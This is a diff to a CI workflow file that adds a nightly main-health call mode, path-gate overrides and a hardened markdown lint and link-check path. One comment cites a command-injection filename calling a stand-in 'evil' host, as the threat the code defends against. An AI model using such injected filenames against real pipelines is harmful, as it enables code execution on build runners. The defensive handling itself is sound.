@@ -7,6 +7,26 @@ name: CI
 
 on:
   pull_request:
+  # #5215 D13 / Task 8: five of the six branch-protection required contexts
+  # (pricing-artifact, docs, test-isolation, license-surface, legal-e2e) are
+  # emitted by THIS workflow, which was `pull_request:`-only — so main had no
+  # post-merge signal for them and could stay red on them indefinitely with
+  # nothing reporting it (#5583 and a test-isolation defect both lived on main
+  # this way). `main-health-nightly.yml` calls this workflow on a schedule with
+  # `main_health: true`, so the SAME jobs emit check-runs on main. It REPORTS;
+  # it does not gate — a scheduled run is not a branch-protection context.
+  # `workflow_call` does NOT inherit secrets by default, so the caller passes
+  # `secrets: inherit`.
+  workflow_call:
+    inputs:
+      main_health:
+        description: >-
+          Main-health nightly call (#5215 D13): force every path-gated surface
+          false so only the five always-on required jobs run — never the
+          empty-diff fallback, which on a schedule would re-run all ~20 gates.
+        required: false
+        type: boolean
+        default: false
 
 jobs:
   # #2149 (ci-audit F3): path-gate the NON-required jobs. `changes` is a
@@ -44,6 +64,24 @@ jobs:
       - name: Compute per-surface path gates (#2149)
         id: gate
         run: |
+          # #5215 Task 8 (D13): a `workflow_call` main-health run has no PR base
+          # — `github.event.pull_request.base.sha` is empty and the empty-diff
+          # fallback below would set EVERY gate true and re-run the whole
+          # ~20-gate matrix nightly (the cost this plan exists to cut). Under
+          # `main_health` only the five always-on required jobs run, so every
+          # gated surface is explicitly false. `inputs.main_health` is empty on
+          # a `pull_request` event, so this branch is main-health only.
+          if [ "${{ inputs.main_health }}" = "true" ]; then
+            for key in migrations dashboard dashboard_e2e uv_lock entrypoints \
+                       client packaging website hosted flip python drift \
+                       driver_scripts ai_review_gate watchdog_scripts \
+                       orphan_bound_scripts; do
+              echo "  $key=false"
+              echo "$key=false" >> "$GITHUB_OUTPUT"
+            done
+            echo "changes: main_health call — all gated surfaces false; only the 5 required jobs run"
+            exit 0
+          fi
           BASE="${{ github.event.pull_request.base.sha }}"
           [ -n "$BASE" ] || BASE="origin/main"
           CHANGED=$(git diff --no-renames --name-only "$BASE...HEAD" 2>/dev/null || true)
@@ -498,7 +536,18 @@ jobs:
   docs:
     runs-on: ubuntu-latest
     steps:
+      # #5215 Task 8 (D13): the main-health call has no PR base, so a scheduled
+      # `git diff` against `pull_request.base.sha` is empty and markdownlint/
+      # lychee would SKIP — the nightly would prove only that this job started,
+      # not that its content checks ran. The main-health call therefore checks
+      # out full history (the diff base is HEAD^); PR runs keep the shallow
+      # default so this change cannot alter PR gating.
       - uses: actions/checkout@v4
+        if: ${{ !inputs.main_health }}
+      - uses: actions/checkout@v4
+        if: ${{ inputs.main_health }}
+        with:
+          fetch-depth: 0
       - name: Conflict-marker check (#2802)
         # A whole-file unresolved conflict block was invisible to every gate and
         # shipped to main twice (#2802, merge b71aa1534). Two independent gaps:
@@ -531,6 +580,11 @@ jobs:
           node-version: '22'
       - name: Get changed markdown files
         id: changed
+        # #5215 Task 8 (D13): a scheduled main-health call has no PR base, so
+        # this PR path is inert there; the main-health path below supplies the
+        # post-merge list. (The guard also keeps this step from running and
+        # failing closed on an empty base once #2386's fail-closed check lands.)
+        if: ${{ !inputs.main_health }}
         run: |
           # `--no-renames` is deliberate here, though this is a lint-target list
           # rather than a changed-set SELECTION set (so the pin that enforces the
@@ -548,6 +602,52 @@ jobs:
         uses: lycheeverse/lychee-action@v2
         with:
           args: --no-progress ${{ steps.changed.outputs.files }}
+      # ----- main-health path (#5215 Task 8 / D13) --------------------------
+      # The PR path above cannot run on a schedule (there is no
+      # `github.event.pull_request.base.sha`), so under `main_health` the
+      # post-merge docs signal is the markdown the newest main commit put
+      # there. The list is NEVER interpolated into a shell: a filename is
+      # PR-author-controlled, and a path like `x $(curl evil)/a.md` would
+      # execute (#4449). markdownlint consumes a NUL list via `xargs -0`;
+      # lychee consumes it via `--files-from`, which reads a FILE.
+      - name: Get changed markdown files (main health)
+        id: changed_mh
+        if: ${{ inputs.main_health }}
+        run: |
+          set -euo pipefail
+          # `--diff-filter ACMR`: a DELETED (or, under `--no-renames`, a renamed
+          # old) .md path does not exist on disk, and lychee hard-errors on a
+          # nonexistent input — so the filter keeps the list to files that are
+          # actually there to lint (main commit 1673f65c5 deleted two docs).
+          git diff --no-renames --diff-filter ACMR -z --name-only HEAD^ HEAD \
+            -- '*.md' > "$RUNNER_TEMP/changed-md.raw.nul"
+          # `./`-prefix every entry so no path can be read as an OPTION by
+          # xargs (argument injection) and lychee's --files-from never treats
+          # it as a `#` comment. NUL-delimited is exact for markdownlint; the
+          # newline view is lychee's line format.
+          sed -z 's|^|./|' "$RUNNER_TEMP/changed-md.raw.nul" \
+            > "$RUNNER_TEMP/changed-md.nul"
+          tr '\0' '\n' < "$RUNNER_TEMP/changed-md.nul" \
+            > "$RUNNER_TEMP/changed-md.txt"
+          count="$(grep -c . "$RUNNER_TEMP/changed-md.txt" || true)"
+          echo "count=${count:-0}" >> "$GITHUB_OUTPUT"
+      - name: Markdownlint (main health, changed files)
+        if: ${{ inputs.main_health && steps.changed_mh.outputs.count != '0' }}
+        run: |
+          # cli2 reads the repo's .markdownlint-cli2.jsonc (MD013 off for
+          # prose); the PR path's v1 invocation is #2386/#5476's to align.
+          # NUL-delimited ARGV via xargs — a filename is data, never shell text.
+          xargs -0 -a "$RUNNER_TEMP/changed-md.nul" \
+            npx --yes markdownlint-cli2@0.23.3
+      - name: Link check (main health, changed files)
+        if: ${{ inputs.main_health && steps.changed_mh.outputs.count != '0' }}
+        uses: lycheeverse/lychee-action@v2
+        with:
+          # `--files-from` reads the list from a FILE — no filename reaches a
+          # shell command (#4449). failIfEmpty: a link-free doc is legitimate
+          # and must not red the nightly.
+          args: --no-progress --files-from ${{ runner.temp }}/changed-md.txt
+          failIfEmpty: false
 
   dashboard-js-tests:
     needs: changes
